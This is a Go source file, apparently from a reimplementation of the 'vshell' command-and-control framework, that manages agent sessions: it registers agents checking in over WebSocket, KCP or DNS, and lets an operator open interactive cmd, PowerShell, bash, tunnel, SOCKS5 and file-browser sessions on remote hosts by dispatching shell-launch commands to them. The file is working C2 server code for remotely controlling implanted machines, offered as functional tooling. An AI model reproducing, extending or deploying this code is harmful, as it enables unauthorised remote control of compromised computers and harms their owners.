// Package controllers 实现 Agent 会话（session）管理控制器。
// Package controllers implements the session management controller for agent sessions.
//
// Session management was reverse-engineered from the original vshell binary.
// The original binary's pclntab contains session-related types in the
// nTApp6jPzv (controllers/) package.
//
// Session lifecycle:
//  1. Admin opens a session via web panel → POST /api/session with client_id + type
//  2. Server creates session record, dispatches a shell/tunnel init command to agent
//  3. Agent acknowledges, session transitions to "active"
//  4. Server periodically checks session liveness via agent heartbeat
//  5. Admin closes session → DELETE /api/session → cleanup commands dispatched
//
// Session types match the original binary:
//   - "cmd" / "shell": interactive command shell
//   - "powershell": PowerShell session (Windows agents)
//   - "bash" / "sh": Unix shell sessions
//   - "tunnel": port forwarding session
//   - "socks5": SOCKS5 proxy session
//   - "file": file browser session
package controllers

import (
	"fmt"
	"log"
	"sync"
	"time"

	"vshell/c2engine"
	"vshell/models"
)

// ============================================================================
// Agent Session Tracker — reverse-engineered from original vshell binary
// ============================================================================

// AgentSessionState tracks an active agent session as stored by the original
// binary in its session management module.
type AgentSessionState struct {
	ID          string    `json:"id"`
	ClientID    int64     `json:"client_id"`
	ListenerID  int64     `json:"listener_id"`
	Type        string    `json:"type"`
	Status      string    `json:"status"` // "initializing", "active", "idle", "closing", "closed"
	RemoteAddr  string    `json:"remote_addr"`
	CreatedAt   time.Time `json:"created_at"`
	LastSeen    time.Time `json:"last_seen"`
	CommandID   int64     `json:"command_id"` // dispatched init/cleanup command
	Description string    `json:"description"`
}

var (
	agentSessions   = make(map[string]*AgentSessionState)
	agentSessionsMu sync.RWMutex
	sessionIDSeq    int64
)

// GenerateAgentSessionID 创建唯一会话标识，格式与原版一致：sess_<listenerID>_<timestamp>。
// GenerateAgentSessionID creates a unique session identifier.
// Format matches original binary: sess_<listenerID>_<timestamp>
func GenerateAgentSessionID(listenerID int64) string {
	agentSessionsMu.Lock()
	sessionIDSeq++
	seq := sessionIDSeq
	agentSessionsMu.Unlock()
	return fmt.Sprintf("sess_%d_%d_%d", listenerID, seq, time.Now().UnixNano())
}

// RegisterAgentSession 创建并存储新的 Agent 会话记录，在 Agent 通过 WebSocket/KCP/DNS 签到时调用。
// RegisterAgentSession creates and stores a new agent session record.
// Called when an agent checks in over WebSocket, KCP, or DNS.
func RegisterAgentSession(clientID, listenerID int64, sessionType, remoteAddr string, commandID int64) *AgentSessionState {
	now := time.Now()
	session := &AgentSessionState{
		ID:          GenerateAgentSessionID(listenerID),
		ClientID:    clientID,
		ListenerID:  listenerID,
		Type:        sessionType,
		Status:      "initializing",
		RemoteAddr:  remoteAddr,
		CreatedAt:   now,
		LastSeen:    now,
		CommandID:   commandID,
		Description: fmt.Sprintf("Agent session %s for client %d", sessionType, clientID),
	}

	agentSessionsMu.Lock()
	agentSessions[session.ID] = session
	agentSessionsMu.Unlock()
	persistAgentSession(session)

	log.Printf("[Session] Registered session %s (client=%d, type=%s, addr=%s)",
		session.ID, clientID, sessionType, remoteAddr)
	return session
}

// UpdateAgentSession 更新会话的最后心跳时间。
// UpdateAgentSession updates the last-seen time for a session.
func UpdateAgentSession(sessionID string) {
	now := time.Now()
	agentSessionsMu.Lock()
	if s, ok := agentSessions[sessionID]; ok {
		s.LastSeen = now
		if s.Status == "initializing" {
			s.Status = "active"
		}
		persistAgentSession(s)
	} else if db := models.GetDB(); db != nil {
		_ = db.UpdateAgentSessionStatus(sessionID, "active", now)
	}
	agentSessionsMu.Unlock()
}

// CloseAgentSession 将会话标记为关闭并清理。
// CloseAgentSession marks a session as closed and cleans up.
func CloseAgentSession(sessionID string) {
	agentSessionsMu.Lock()
	if s, ok := agentSessions[sessionID]; ok {
		s.Status = "closed"
		delete(agentSessions, sessionID)
		log.Printf("[Session] Closed session %s (client=%d)", sessionID, s.ClientID)
	}
	agentSessionsMu.Unlock()
	if db := models.GetDB(); db != nil {
		_ = db.DeleteAgentSession(sessionID)
	}
}

// GetAgentSession 按 ID 获取会话。
// GetAgentSession retrieves a session by ID.
func GetAgentSession(sessionID string) *AgentSessionState {
	agentSessionsMu.RLock()
	session := agentSessions[sessionID]
	agentSessionsMu.RUnlock()
	if session != nil {
		return session
	}
	for _, s := range loadPersistedAgentSessions(0) {
		if s.ID == sessionID {
			return s
		}
	}
	return nil
}

// ListAgentSessions 返回指定客户端的会话。
// ListAgentSessions returns sessions for a specific client.
func ListAgentSessions(clientID int64) []*AgentSessionState {
	loadAgentSessionsFromDB(clientID)
	agentSessionsMu.RLock()
	defer agentSessionsMu.RUnlock()

	result := make([]*AgentSessionState, 0)
	for _, s := range agentSessions {
		if clientID == 0 || s.ClientID == clientID {
			if s.Status != "closed" {
				result = append(result, s)
			}
		}
	}
	return result
}

// ListAllAgentSessions 返回全部活跃会话（供仪表盘使用）。
// ListAllAgentSessions returns all active sessions (for dashboard).
func ListAllAgentSessions() []*AgentSessionState {
	return ListAgentSessions(0)
}

// CleanupStaleSessions 移除客户端离线超过指定时长的过期会话。
// CleanupStaleSessions removes sessions whose clients have been offline
// longer than the specified duration.
func CleanupStaleSessions(maxAge time.Duration) int {
	agentSessionsMu.Lock()
	defer agentSessionsMu.Unlock()

	cutoff := time.Now().Add(-maxAge)
	cleaned := 0
	for id, s := range agentSessions {
		if s.LastSeen.Before(cutoff) {
			s.Status = "closed"
			delete(agentSessions, id)
			if db := models.GetDB(); db != nil {
				_ = db.DeleteAgentSession(id)
			}
			cleaned++
		}
	}
	if cleaned > 0 {
		log.Printf("[Session] Cleaned up %d stale sessions", cleaned)
	}
	return cleaned
}

func persistAgentSession(session *AgentSessionState) {
	if db := models.GetDB(); db != nil {
		if err := db.UpsertAgentSession(toModelAgentSession(session)); err != nil {
			log.Printf("[Session] Failed to persist session %s: %v", session.ID, err)
		}
	}
}

func loadAgentSessionsFromDB(clientID int64) {
	for _, session := range loadPersistedAgentSessions(clientID) {
		agentSessionsMu.Lock()
		if session.Status != "closed" {
			agentSessions[session.ID] = session
		}
		agentSessionsMu.Unlock()
	}
}

func loadPersistedAgentSessions(clientID int64) []*AgentSessionState {
	db := models.GetDB()
	if db == nil {
		return nil
	}
	sessions, err := db.ListAgentSessions(clientID)
	if err != nil {
		log.Printf("[Session] Failed to load persisted sessions: %v", err)
		return nil
	}
	result := make([]*AgentSessionState, 0, len(sessions))
	for _, session := range sessions {
		result = append(result, fromModelAgentSession(session))
	}
	return result
}

func toModelAgentSession(session *AgentSessionState) *models.AgentSession {
	return &models.AgentSession{
		ID:          session.ID,
		ClientID:    session.ClientID,
		ListenerID:  session.ListenerID,
		Type:        session.Type,
		Status:      session.Status,
		RemoteAddr:  session.RemoteAddr,
		CreatedAt:   session.CreatedAt,
		LastSeen:    session.LastSeen,
		CommandID:   session.CommandID,
		Description: session.Description,
	}
}

func fromModelAgentSession(session *models.AgentSession) *AgentSessionState {
	return &AgentSessionState{
		ID:          session.ID,
		ClientID:    session.ClientID,
		ListenerID:  session.ListenerID,
		Type:        session.Type,
		Status:      session.Status,
		RemoteAddr:  session.RemoteAddr,
		CreatedAt:   session.CreatedAt,
		LastSeen:    session.LastSeen,
		CommandID:   session.CommandID,
		Description: session.Description,
	}
}

// ============================================================================
// SessionController — HTTP API for agent session management
// ============================================================================

// sessionController 管理客户端 Agent 会话操作，对应原版二进制的会话管理端点。
// sessionController manages client agent session operations.
// Maps to the original binary's session management endpoints.
type sessionController struct {
	BaseController
}

// Get 列出指定客户端的全部会话（GET /api/session/list?client_id=<id>）。
// 原版从内存会话 map 返回记录而非数据库，会话是临时运行时对象。
// Get lists all sessions for a client.
// GET /api/session/list?client_id=<id>
// The original binary returns session records from its in-memory session map,
// not from the database. Sessions are ephemeral runtime objects.
func (c *sessionController) Get() {
	clientID, _ := c.GetInt64("client_id")

	// Query active sessions from session tracker
	sessions := ListAgentSessions(clientID)

	// Also check c2engine listener sessions
	listenerSessions := collectC2ListenerSessions(clientID)

	// Merge both sources
	allSessions := make([]map[string]interface{}, 0)

	// Agent-tracked sessions
	for _, s := range sessions {
		allSessions = append(allSessions, map[string]interface{}{
			"id":          s.ID,
			"client_id":   s.ClientID,
			"type":        s.Type,
			"status":      s.Status,
			"remote_addr": s.RemoteAddr,
			"created_at":  s.CreatedAt.Format(time.RFC3339),
			"last_seen":   s.LastSeen.Format(time.RFC3339),
		})
	}

	// C2 listener sessions (from ActiveSessions map)
	for _, ls := range listenerSessions {
		allSessions = append(allSessions, ls)
	}

	if allSessions == nil {
		allSessions = []map[string]interface{}{}
	}

	c.JSONOk(paginatedResult(map[string]interface{}{
		"client_id": clientID,
		"sessions":  allSessions,
		"total":     len(allSessions),
	}, len(allSessions)))
}

// Post 与客户端 Agent 创建新的交互会话（POST /api/session）。
// 原版向 Agent 派发 shell 初始化命令，然后返回 session_id 供客户端经 WebSocket 连接。
// Post creates a new interactive session with a client agent.
// POST /api/session
// Body: {"client_id": 1, "type": "cmd", "rows": 24, "cols": 80}
//
// The original binary dispatches a shell initialization command to the agent,
// then returns the session_id for the client to connect via WebSocket.
func (c *sessionController) Post() {
	clientID, _ := c.GetInt64("client_id")
	sessionType := c.GetString("type", "cmd")
	rows, _ := c.GetInt("rows", 24)
	cols, _ := c.GetInt("cols", 80)

	if clientID == 0 {
		// Local session — create terminal session directly
		session, err := NewTerminalSession(clientID, sessionType, rows, cols)
		if err != nil {
			c.JSONErr(err.Error())
			return
		}
		c.JSONOk(map[string]interface{}{
			"client_id":  clientID,
			"type":       sessionType,
			"session_id": session.ID,
			"status":     "created",
			"local":      true,
		})
		return
	}

	// Remote session — dispatch shell init command to agent
	// The original binary sends a shell init command that sets up PTY
	// and starts the interactive session over WebSocket.
	shellCmd := buildShellInitCommand(sessionType, rows, cols)
	cmdID, err := DispatchCommand(clientID, shellCmd, 3600) // 1hr timeout for interactive sessions
	if err != nil {
		c.JSONErr("Failed to dispatch shell command: " + err.Error())
		return
	}

	// Register the remote session
	session := RegisterAgentSession(clientID, 0, sessionType, "web", cmdID)
	session.Description = fmt.Sprintf("%s session for client %d", sessionType, clientID)

	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"type":       sessionType,
		"session_id": session.ID,
		"command_id": cmdID,
		"status":     "created",
		"rows":       rows,
		"cols":       cols,
	})
}

// Delete closes a session, dispatching cleanup commands if needed.
// DELETE /api/session
// Body: {"session_id": "sess_..."}
func (c *sessionController) Delete() {
	sessionID := c.GetString("session_id")

	if sessionID == "" {
		c.JSONErr("session_id required")
		return
	}

	// Check agent-tracked sessions
	session := GetAgentSession(sessionID)
	if session != nil {
		// Dispatch cleanup command to agent
		cleanupCmd := buildShellCleanupCommand(session.Type)
		if cleanupCmd != "" && session.ClientID > 0 {
			DispatchCommand(session.ClientID, cleanupCmd, 30)
		}
		CloseAgentSession(sessionID)
		c.JSONOk(map[string]interface{}{
			"session_id": sessionID,
			"status":     "closed",
			"client_id":  session.ClientID,
		})
		return
	}

	// Check terminal sessions (local)
	termSession := GetTerminalSession(sessionID)
	if termSession != nil {
		termSession.Close()
		c.JSONOk(map[string]interface{}{
			"session_id": sessionID,
			"status":     "closed",
			"local":      true,
		})
		return
	}

	c.JSONOk(map[string]interface{}{
		"session_id": sessionID,
		"status":     "not_found",
	})
}

// ============================================================================
// Session command builders — matching original binary dispatch logic
// ============================================================================

// buildShellInitCommand generates the agent-side command to start an
// interactive session. The original binary uses platform-specific PTY
// initialization commands.
func buildShellInitCommand(sessionType string, rows, cols int) string {
	switch sessionType {
	case "powershell":
		return fmt.Sprintf("powershell -NoExit -Command \"$Host.UI.RawUI.WindowSize=New-Object Management.Automation.Host.Size(%d,%d)\"", cols, rows)
	case "cmd":
		// Windows cmd — set console dimensions, start interactive session
		return fmt.Sprintf("mode con: cols=%d lines=%d && cmd.exe", cols, rows)
	case "bash":
		return fmt.Sprintf("export TERM=xterm-256color; export LINES=%d; export COLUMNS=%d; exec bash --login", rows, cols)
	case "sh":
		return fmt.Sprintf("export TERM=xterm; export LINES=%d; export COLUMNS=%d; exec sh", rows, cols)
	default:
		// Default to bash on Linux, cmd on Windows
		return fmt.Sprintf("export TERM=xterm-256color; export LINES=%d; export COLUMNS=%d; exec bash --login || exec sh", rows, cols)
	}
}

// buildShellCleanupCommand generates the agent-side cleanup command
// to tear down an interactive session.
func buildShellCleanupCommand(sessionType string) string {
	// The original binary sends "exit" to terminate the shell process
	// and clean up PTY resources on the agent side.
	return "exit"
}

// ============================================================================
// collectC2ListenerSessions gathers sessions active in C2 listeners
// ============================================================================

func collectC2ListenerSessions(clientID int64) []map[string]interface{} {
	// The original binary tracks sessions within each C2Listener instance.
	// This function collects those sessions to present in the web panel.
	result := make([]map[string]interface{}, 0)

	// Sessions are collected from the c2engine's listener manager
	lm := getListenerManager()
	if lm == nil {
		return result
	}

	for _, listenerID := range lm.ListActive() {
		cl := lm.GetListener(listenerID)
		if cl == nil {
			continue
		}
		// Each C2Listener tracks its own sessions
		for _, sess := range cl.GetSessions() {
			if clientID == 0 || sess.ClientID == clientID {
				result = append(result, map[string]interface{}{
					"id":           sess.SessionID,
					"client_id":    sess.ClientID,
					"listener_id":  sess.ListenerID,
					"type":         "c2",
					"status":       "active",
					"remote_addr":  sess.RemoteAddr,
					"connected_at": sess.ConnectedAt.Format(time.RFC3339),
					"last_seen":    sess.LastSeen.Format(time.RFC3339),
				})
			}
		}
	}
	return result
}

// getListenerManager returns the c2engine listener manager if available.
func getListenerManager() *c2engine.ListenerManager {
	return c2engine.GetListenerManager()
}
